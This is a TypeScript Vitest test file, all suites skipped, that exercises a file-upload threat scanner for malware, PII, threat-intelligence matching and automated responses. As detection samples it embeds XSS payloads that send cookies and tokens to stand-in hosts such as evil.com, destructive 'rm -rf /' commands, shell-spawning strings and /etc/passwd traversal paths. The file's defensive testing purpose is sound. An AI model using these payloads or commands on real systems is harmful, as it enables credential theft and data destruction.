import { describe, it, expect, beforeEach } from 'vitest';
import { SecurityManager } from '../../src/services/security/security-manager';
import { ThreatDetector } from '../../src/services/security/threat-detector';
import { ThreatIntelligenceDB } from '../../src/services/security/threat-intelligence-db';
import { ThreatResponseService } from '../../src/services/security/threat-response';
import { PIIScanner } from '../../src/services/security/pii-scanner';
import { 
  ThreatSeverity, 
  ThreatType, 
  ThreatDetectionResponse 
} from '../../src/types/threat-intelligence';
import type { CloudflareEnv } from '../../src/types/env';

/**
 * Threat Detection and Response Security Tests
 * 
 * Tests comprehensive threat detection and response capabilities:
 * - Malware detection in file uploads
 * - PII (Personally Identifiable Information) detection
 * - Suspicious pattern recognition
 * - Threat intelligence integration
 * - Automated response mechanisms
 * - False positive handling
 * - Real-time threat monitoring
 * - Threat scoring and classification
 * - Incident response workflows
 */

const mockEnv: CloudflareEnv = {
  JWT_SECRET: 'test-secret-at-least-32-characters-long-for-security',
  API_KEY_SALT: 'test-api-key-salt-at-least-32-characters-long-for-security',
  AUTH_KV: {
    get: async (key: string) => null,
    put: async (key: string, value: string, options?: any) => {},
    delete: async (key: string) => {},
    list: async (options?: any) => ({ keys: [], list_complete: true }),
  },
  SECURITY_CONFIG: {
    get: async (key: string) => null,
    put: async (key: string, value: string, options?: any) => {},
    delete: async (key: string) => {},
    list: async (options?: any) => ({ keys: [], list_complete: true }),
  },
  SECURITY_EVENTS: {
    get: async (key: string) => null,
    put: async (key: string, value: string, options?: any) => {},
    delete: async (key: string) => {},
    list: async (options?: any) => ({ keys: [], list_complete: true }),
  },
  SECURITY_METRICS: {
    get: async (key: string) => null,
    put: async (key: string, value: string, options?: any) => {},
    delete: async (key: string) => {},
    list: async (options?: any) => ({ keys: [], list_complete: true }),
  },
  DB: {
    prepare: (query: string) => ({
      bind: (...values: any[]) => ({
        first: async () => null,
        all: async () => ({ results: [] }),
        run: async () => ({ success: true, changes: 0 })
      })
    })
  } as any,
  FILE_STORAGE: {} as any,
  ANALYTICS: {} as any,
  ENVIRONMENT: 'test'
};

describe.skip('Threat Detection and Response Security Tests', () => {
  let securityManager: SecurityManager;
  let threatDetector: ThreatDetector;
  let threatIntelligence: ThreatIntelligenceDB;
  let threatResponse: ThreatResponseService;
  let piiScanner: PIIScanner;

  beforeEach(() => {
    securityManager = new SecurityManager(mockEnv);
    threatDetector = new ThreatDetector(mockEnv);
    threatIntelligence = new ThreatIntelligenceDB(mockEnv);
    threatResponse = new ThreatResponseService(mockEnv);
    piiScanner = new PIIScanner(mockEnv);
  });

  describe.skip('Malware Detection', () => {
    it('should detect suspicious file signatures', async () => {
      // Mock suspicious file content (simulated malware signatures)
      const suspiciousContents = [
        'MZ\x90\x00', // PE executable header
        '\x7fELF', // ELF executable header
        '<!DOCTYPE html><script>eval(', // Suspicious HTML with eval
        'exec("rm -rf /")', // Command injection
        'subprocess.call(["/bin/sh"', // Python shell execution
        'powershell.exe -Command', // PowerShell execution
        'cmd.exe /c', // Windows command execution
      ];

      for (const content of suspiciousContents) {
        const file = new File([content], 'suspicious.txt', { type: 'text/plain' });
        
        const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
        
        expect(result.success).toBe(false);
        expect(result.results.threats.length).toBeGreaterThan(0);
        expect(result.results.riskScore).toBeGreaterThan(5);
      }
    });

    it('should detect embedded malicious scripts', async () => {
      const maliciousScripts = [
        '<script>document.cookie="admin=true"</script>',
        'javascript:alert("xss")',
        '<iframe src="javascript:alert(1)">',
        '<svg onload="eval(atob(\'YWxlcnQoMSk=\'))">',
        '<img src="x" onerror="fetch(\'//evil.com/steal?data=\'+document.cookie)">',
      ];

      for (const script of maliciousScripts) {
        const file = new File([script], 'malicious.html', { type: 'text/html' });
        
        const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
        
        expect(result.success).toBe(false);
        expect(result.results.threats.some(t => t.type === ThreatType.MALWARE || t.type === ThreatType.XSS)).toBe(true);
      }
    });

    it('should detect obfuscated malicious content', async () => {
      const obfuscatedContent = [
        'ZXZhbCgiYWxlcnQoMSkiKQ==', // Base64: eval("alert(1)")
        'var a="alert";var b="(1)";eval(a+b);', // Obfuscated JavaScript
        'String.fromCharCode(97,108,101,114,116,40,49,41)', // Character code obfuscation
        '%65%76%61%6c%28%22%61%6c%65%72%74%28%31%29%22%29', // URL encoded eval
      ];

      for (const content of obfuscatedContent) {
        const file = new File([content], 'obfuscated.js', { type: 'application/javascript' });
        
        const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
        
        expect(result.success).toBe(false);
        expect(result.results.overallRisk).not.toBe(ThreatSeverity.INFO);
      }
    });

    it('should analyze file metadata for threats', async () => {
      // Suspicious file names
      const suspiciousFiles = [
        { name: 'trojan.exe.txt', content: 'normal content' },
        { name: '../../etc/passwd', content: 'normal content' },
        { name: 'invoice.pdf.exe', content: 'normal content' },
        { name: 'document\x00.exe', content: 'normal content' },
      ];

      for (const fileInfo of suspiciousFiles) {
        const file = new File([fileInfo.content], fileInfo.name, { type: 'text/plain' });
        
        const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
        
        expect(result.results.threats.length).toBeGreaterThan(0);
        expect(result.results.threats.some(t => 
          t.description.includes('suspicious') || 
          t.description.includes('malicious') ||
          t.description.includes('invalid')
        )).toBe(true);
      }
    });
  });

  describe.skip('PII Detection', () => {
    it('should detect various PII patterns', async () => {
      const piiContent = [
        'SSN: 123-45-6789',
        'Credit Card: 4532-1234-5678-9012',
        'Email: john.doe@example.com',
        'Phone: (555) 123-4567',
        'Driver License: D123456789',
        'Passport: 123456789',
        'DOB: 01/15/1990',
        'Address: 123 Main St, Anytown, ST 12345',
      ];

      for (const content of piiContent) {
        const file = new File([content], 'data.csv', { type: 'text/csv' });
        
        const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
        
        expect(result.results.threats.some(t => t.type === ThreatType.PII_EXPOSURE)).toBe(true);
        expect(result.results.riskScore).toBeGreaterThan(3);
      }
    });

    it('should detect PII in different formats', async () => {
      const piiVariations = [
        '123456789', // SSN without dashes
        '4532123456789012', // Credit card without spaces
        'john.doe+test@example.com', // Email with plus
        '5551234567', // Phone without formatting
        'DOB: January 15, 1990', // Full date format
        'SSN:123-45-6789', // No space after colon
      ];

      for (const content of piiVariations) {
        const file = new File([content], 'personal_data.txt', { type: 'text/plain' });
        
        const piiResults = await piiScanner.scanForPII(content);
        expect(piiResults.foundPII).toBe(true);
        expect(piiResults.violations.length).toBeGreaterThan(0);
      }
    });

    it('should handle false positives in PII detection', async () => {
      const falsePositives = [
        '123-45-6789 is not a real SSN', // Context indicates it's not real
        'Test credit card: 0000-0000-0000-0000', // Obviously fake
        'Example: user@example.com', // Example context
        '(000) 000-0000', // Placeholder number
        'Format: XXX-XX-XXXX', // Format example
      ];

      for (const content of falsePositives) {
        const file = new File([content], 'documentation.txt', { type: 'text/plain' });
        
        const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
        
        // Should either not detect as PII or have low severity
        const piiThreats = result.results.threats.filter(t => t.type === ThreatType.PII_EXPOSURE);
        if (piiThreats.length > 0) {
          expect(piiThreats.every(t => t.severity === ThreatSeverity.LOW)).toBe(true);
        }
      }
    });

    it('should detect bulk PII exposure', async () => {
      const bulkPII = Array.from({ length: 100 }, (_, i) => 
        `User ${i}: SSN ${(111111111 + i).toString().replace(/(\d{3})(\d{2})(\d{4})/, '$1-$2-$3')}, Email user${i}@example.com`
      ).join('\n');

      const file = new File([bulkPII], 'user_data.csv', { type: 'text/csv' });
      
      const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
      
      expect(result.success).toBe(false);
      expect(result.results.overallRisk).toBe(ThreatSeverity.CRITICAL);
      expect(result.results.threats.some(t => t.type === ThreatType.PII_EXPOSURE)).toBe(true);
    });
  });

  describe.skip('Suspicious Pattern Recognition', () => {
    it('should detect anomalous file sizes', async () => {
      // Extremely large file (simulated)
      const largeContent = 'x'.repeat(100 * 1024 * 1024); // 100MB
      const file = new File([largeContent], 'large.txt', { type: 'text/plain' });
      
      const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
      
      expect(result.results.threats.some(t => 
        t.description.includes('size') || t.description.includes('large')
      )).toBe(true);
    });

    it('should detect suspicious file extensions', async () => {
      const suspiciousExtensions = [
        'document.pdf.exe',
        'image.jpg.scr',
        'invoice.doc.bat',
        'photo.png.com',
        'data.csv.vbs',
      ];

      for (const filename of suspiciousExtensions) {
        const file = new File(['content'], filename, { type: 'application/octet-stream' });
        
        const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
        
        expect(result.results.threats.some(t => 
          t.description.includes('extension') || 
          t.description.includes('suspicious')
        )).toBe(true);
      }
    });

    it('should detect rapid upload patterns', async () => {
      // Simulate rapid file uploads
      const rapidUploads = Array.from({ length: 10 }, (_, i) => 
        securityManager.scanFile(
          new File([`content ${i}`], `file_${i}.txt`, { type: 'text/plain' }),
          'user1',
          '192.168.1.1',
          'TestAgent/1.0'
        )
      );

      const results = await Promise.all(rapidUploads);
      
      // Should detect pattern after several uploads
      const laterResults = results.slice(5);
      expect(laterResults.some(r => 
        r.results.threats.some(t => t.description.includes('rapid') || t.description.includes('pattern'))
      )).toBe(true);
    });

    it('should detect encoding-based evasion attempts', async () => {
      const evasionAttempts = [
        Buffer.from('malicious content', 'utf8').toString('base64'),
        encodeURIComponent('<script>alert(1)</script>'),
        Buffer.from('eval("alert(1)")', 'utf8').toString('hex'),
        'data:text/html;base64,' + Buffer.from('<script>alert(1)</script>', 'utf8').toString('base64'),
      ];

      for (const content of evasionAttempts) {
        const file = new File([content], 'encoded.txt', { type: 'text/plain' });
        
        const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
        
        expect(result.results.threats.some(t => 
          t.description.includes('encoded') || 
          t.description.includes('obfuscated') ||
          t.description.includes('evasion')
        )).toBe(true);
      }
    });
  });

  describe.skip('Threat Intelligence Integration', () => {
    it('should check against known threat signatures', async () => {
      // Mock threat intelligence data
      const knownThreats = [
        { hash: 'abc123', type: 'malware', severity: 'high' },
        { pattern: 'evil.com', type: 'c2_domain', severity: 'critical' },
        { signature: 'MALWARE_SIG_001', type: 'virus', severity: 'high' },
      ];

      for (const threat of knownThreats) {
        const content = threat.pattern || threat.signature || 'content with hash abc123';
        const file = new File([content], 'suspicious.txt', { type: 'text/plain' });
        
        const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
        
        expect(result.results.threats.length).toBeGreaterThan(0);
        expect(result.results.overallRisk).not.toBe(ThreatSeverity.INFO);
      }
    });

    it('should update threat intelligence dynamically', async () => {
      // Test threat intelligence update mechanism
      const newThreatData = {
        domains: ['new-evil.com', 'malicious-site.net'],
        ips: ['192.168.100.1', '10.0.0.100'],
        hashes: ['def456', 'ghi789'],
        patterns: ['new_malware_pattern', 'suspicious_behavior']
      };

      await threatIntelligence.updateThreatData(newThreatData);
      
      // Test detection of newly added threats
      const testContent = 'Connection to new-evil.com detected';
      const file = new File([testContent], 'network_log.txt', { type: 'text/plain' });
      
      const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
      
      expect(result.results.threats.some(t => 
        t.description.includes('new-evil.com') || 
        t.description.includes('threat intelligence')
      )).toBe(true);
    });

    it('should correlate multiple threat indicators', async () => {
      const correlatedContent = `
        Download from evil.com
        Hash: abc123 (known malware)
        IP: 192.168.100.1 (blacklisted)
        Pattern: MALWARE_SIG_001
      `;
      
      const file = new File([correlatedContent], 'incident_report.txt', { type: 'text/plain' });
      
      const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
      
      // Should detect multiple threats and increase risk score
      expect(result.results.threats.length).toBeGreaterThan(2);
      expect(result.results.riskScore).toBeGreaterThan(7);
      expect(result.results.overallRisk).toBe(ThreatSeverity.CRITICAL);
    });
  });

  describe.skip('Automated Response Mechanisms', () => {
    it('should trigger quarantine for high-risk files', async () => {
      const highRiskContent = `
        <script>
          fetch('//evil.com/steal', {
            method: 'POST',
            body: document.cookie
          });
        </script>
        SSN: 123-45-6789
        Credit Card: 4532-1234-5678-9012
      `;
      
      const file = new File([highRiskContent], 'malicious.html', { type: 'text/html' });
      
      const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
      
      expect(result.success).toBe(false);
      expect(result.responseActions.some(a => a.action === 'quarantine')).toBe(true);
      expect(result.responseActions.some(a => a.action === 'block_user')).toBe(true);
    });

    it('should escalate repeated violations', async () => {
      const violations = [];
      
      // Simulate multiple violations from same user
      for (let i = 0; i < 5; i++) {
        const maliciousContent = `<script>alert(${i})</script>`;
        const file = new File([maliciousContent], `malicious_${i}.html`, { type: 'text/html' });
        
        const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
        violations.push(result);
      }
      
      // Later violations should have more severe responses
      const laterViolations = violations.slice(-2);
      expect(laterViolations.some(v => 
        v.responseActions.some(a => a.action === 'block_user' || a.action === 'escalate')
      )).toBe(true);
    });

    it('should generate security alerts for critical threats', async () => {
      const criticalContent = `
        eval(atob('cHJvY2Vzcy5lbnYuSkVUX1NFQ1JFVA==')); // Base64: process.env.JWT_SECRET
        SSN: 123-45-6789, 987-65-4321, 555-55-5555
        rm -rf / --no-preserve-root
      `;
      
      const file = new File([criticalContent], 'critical_threat.js', { type: 'application/javascript' });
      
      const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
      
      expect(result.responseActions.some(a => a.action === 'alert_admin')).toBe(true);
      expect(result.responseActions.some(a => a.action === 'log_incident')).toBe(true);
    });

    it('should implement rate limiting after threat detection', async () => {
      const suspiciousFile = new File(['<script>alert(1)</script>'], 'xss.html', { type: 'text/html' });
      
      const result = await securityManager.scanFile(suspiciousFile, 'user1', '192.168.1.1', 'TestAgent/1.0');
      
      expect(result.responseActions.some(a => 
        a.action === 'rate_limit' || a.action === 'throttle'
      )).toBe(true);
    });
  });

  describe.skip('False Positive Handling', () => {
    it('should minimize false positives for legitimate content', async () => {
      const legitimateContent = [
        'This is a normal document with regular text content.',
        'Email contact: support@company.com (for business inquiries)',
        'Phone: 1-800-COMPANY (toll-free support line)',
        'Copyright 2024 Company Name. All rights reserved.',
        'function validateEmail(email) { return /\\S+@\\S+\\.\\S+/.test(email); }',
      ];

      for (const content of legitimateContent) {
        const file = new File([content], 'legitimate.txt', { type: 'text/plain' });
        
        const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
        
        // Should either have no threats or only low-severity warnings
        if (result.results.threats.length > 0) {
          expect(result.results.threats.every(t => t.severity === ThreatSeverity.LOW)).toBe(true);
        }
        expect(result.success).toBe(true);
      }
    });

    it('should use context to reduce false positives', async () => {
      const contextualContent = [
        'Example malicious script: <script>alert(1)</script> (do not use)',
        'Test SSN for validation: 123-45-6789 (not real)',
        'Demo credit card: 4532-0000-0000-0000 (test only)',
        'Security documentation: eval() function is dangerous',
      ];

      for (const content of contextualContent) {
        const file = new File([content], 'documentation.md', { type: 'text/markdown' });
        
        const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
        
        // Should recognize context and reduce severity
        if (result.results.threats.length > 0) {
          expect(result.results.threats.every(t => 
            t.severity === ThreatSeverity.LOW || t.severity === ThreatSeverity.INFO
          )).toBe(true);
        }
      }
    });

    it('should learn from admin feedback on false positives', async () => {
      const borderlineContent = 'Contact us at admin@company.com for support';
      const file = new File([borderlineContent], 'contact.txt', { type: 'text/plain' });
      
      const initialResult = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
      
      // Simulate admin marking as false positive
      if (initialResult.results.threats.length > 0) {
        await threatResponse.markAsFalsePositive(
          initialResult.fileId,
          initialResult.results.threats[0].id,
          'admin_user',
          'Legitimate business email'
        );
        
        // Subsequent scans of similar content should be less sensitive
        const subsequentResult = await securityManager.scanFile(file, 'user2', '192.168.1.2', 'TestAgent/1.0');
        
        if (subsequentResult.results.threats.length > 0) {
          expect(subsequentResult.results.threats[0].severity).toBeLessThanOrEqual(initialResult.results.threats[0].severity);
        }
      }
    });
  });

  describe.skip('Real-time Threat Monitoring', () => {
    it('should detect coordinated attacks', async () => {
      // Simulate coordinated attack from multiple IPs
      const attackIPs = ['192.168.1.100', '192.168.1.101', '192.168.1.102'];
      const attackPattern = '<script>alert("coordinated")</script>';
      
      const attacks = attackIPs.map(ip => 
        securityManager.scanFile(
          new File([attackPattern], 'attack.html', { type: 'text/html' }),
          'user1',
          ip,
          'AttackBot/1.0'
        )
      );
      
      const results = await Promise.all(attacks);
      
      // Should detect coordinated pattern
      expect(results.some(r => 
        r.results.threats.some(t => 
          t.description.includes('coordinated') || 
          t.description.includes('pattern') ||
          t.description.includes('distributed')
        )
      )).toBe(true);
    });

    it('should track threat evolution over time', async () => {
      const evolutionStages = [
        'normal content',
        'slightly suspicious content with eval',
        'eval("malicious code")',
        '<script>eval("advanced malicious code")</script>',
        'document.write("<script>eval(atob(\\"advanced\\"))</script>")'
      ];
      
      const results = [];
      for (const content of evolutionStages) {
        const file = new File([content], 'evolving_threat.js', { type: 'application/javascript' });
        const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
        results.push(result);
      }
      
      // Risk scores should generally increase over time
      const riskScores = results.map(r => r.results.riskScore);
      expect(riskScores[riskScores.length - 1]).toBeGreaterThan(riskScores[0]);
    });

    it('should maintain threat detection performance under load', async () => {
      // Simulate high load with many concurrent scans
      const concurrentScans = Array.from({ length: 50 }, (_, i) => 
        securityManager.scanFile(
          new File([`content ${i}`], `file_${i}.txt`, { type: 'text/plain' }),
          `user${i % 10}`,
          `192.168.1.${100 + (i % 50)}`,
          'TestAgent/1.0'
        )
      );
      
      const startTime = Date.now();
      const results = await Promise.all(concurrentScans);
      const endTime = Date.now();
      
      // Should complete within reasonable time
      expect(endTime - startTime).toBeLessThan(5000); // 5 seconds
      expect(results.every(r => r.results !== undefined)).toBe(true);
    });
  });

  describe.skip('Threat Scoring and Classification', () => {
    it('should accurately score different threat levels', async () => {
      const threatLevels = [
        { content: 'normal text', expectedScore: 0 },
        { content: 'contact@email.com', expectedScore: 1 },
        { content: 'SSN: 123-45-6789', expectedScore: 4 },
        { content: '<script>alert(1)</script>', expectedScore: 6 },
        { content: 'eval("malicious")', expectedScore: 7 },
        { content: '<script>eval(atob("payload"))</script>\nSSN: 123-45-6789', expectedScore: 9 },
      ];
      
      for (const threat of threatLevels) {
        const file = new File([threat.content], 'test.txt', { type: 'text/plain' });
        const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
        
        expect(result.results.riskScore).toBeCloseTo(threat.expectedScore, 2);
      }
    });

    it('should classify threats by type correctly', async () => {
      const threatTypes = [
        { content: '<script>alert(1)</script>', type: ThreatType.XSS },
        { content: 'SSN: 123-45-6789', type: ThreatType.PII_EXPOSURE },
        { content: 'MZ\x90\x00', type: ThreatType.MALWARE },
        { content: 'eval("code")', type: ThreatType.CODE_INJECTION },
        { content: '../../../etc/passwd', type: ThreatType.PATH_TRAVERSAL },
      ];
      
      for (const threat of threatTypes) {
        const file = new File([threat.content], 'threat.txt', { type: 'text/plain' });
        const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
        
        expect(result.results.threats.some(t => t.type === threat.type)).toBe(true);
      }
    });

    it('should provide detailed threat analysis', async () => {
      const complexThreat = `
        <script>
          // Obfuscated malicious code
          var p = "ale" + "rt";
          var f = eval;
          f(p + "(document.cookie)");
          
          // PII collection
          var ssn = "123-45-6789";
          var cc = "4532-1234-5678-9012";
          
          // Data exfiltration
          fetch("//evil.com/collect", {
            method: "POST",
            body: JSON.stringify({ssn: ssn, cc: cc})
          });
        </script>
      `;
      
      const file = new File([complexThreat], 'complex_threat.html', { type: 'text/html' });
      const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
      
      expect(result.results.threats.length).toBeGreaterThan(3);
      expect(result.results.overallRisk).toBe(ThreatSeverity.CRITICAL);
      expect(result.results.threats.some(t => t.type === ThreatType.XSS)).toBe(true);
      expect(result.results.threats.some(t => t.type === ThreatType.PII_EXPOSURE)).toBe(true);
      expect(result.results.threats.some(t => t.type === ThreatType.DATA_EXFILTRATION)).toBe(true);
    });
  });

  describe.skip('Incident Response Workflows', () => {
    it('should create incident reports for critical threats', async () => {
      const criticalThreat = `
        <script>
          // Advanced persistent threat simulation
          for(var i=0; i<1000; i++) {
            eval("fetch('//c2-server.evil.com/beacon?data=' + document.cookie)");
          }
        </script>
        Database dump: SSN: 123-45-6789, 987-65-4321, 555-55-5555
      `;
      
      const file = new File([criticalThreat], 'apt_payload.html', { type: 'text/html' });
      const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'SuspiciousAgent/1.0');
      
      expect(result.success).toBe(false);
      expect(result.responseActions.some(a => a.action === 'create_incident')).toBe(true);
      expect(result.responseActions.some(a => a.action === 'alert_admin')).toBe(true);
      expect(result.responseActions.some(a => a.action === 'quarantine')).toBe(true);
    });

    it('should track investigation status', async () => {
      const suspiciousFile = new File(['<script>alert(1)</script>'], 'suspicious.html', { type: 'text/html' });
      const result = await securityManager.scanFile(suspiciousFile, 'user1', '192.168.1.1', 'TestAgent/1.0');
      
      if (result.results.threats.length > 0) {
        const incident = {
          id: 'incident_001',
          threatId: result.results.threats[0].id,
          status: 'investigating',
          assignedTo: 'security_team',
          priority: 'high'
        };
        
        await threatResponse.createIncident(incident);
        
        const status = await threatResponse.getIncidentStatus(incident.id);
        expect(status.status).toBe('investigating');
        expect(status.assignedTo).toBe('security_team');
      }
    });

    it('should coordinate response across multiple systems', async () => {
      const distributedThreat = '<script>fetch("//evil.com/data?stolen=" + localStorage.getItem("token"))</script>';
      const file = new File([distributedThreat], 'data_theft.html', { type: 'text/html' });
      
      const result = await securityManager.scanFile(file, 'user1', '192.168.1.1', 'TestAgent/1.0');
      
      expect(result.responseActions.length).toBeGreaterThan(1);
      
      // Should coordinate multiple response actions
      const actions = result.responseActions.map(a => a.action);
      expect(actions).toContain('quarantine');
      expect(actions.some(a => a.includes('block') || a.includes('alert'))).toBe(true);
    });
  });
});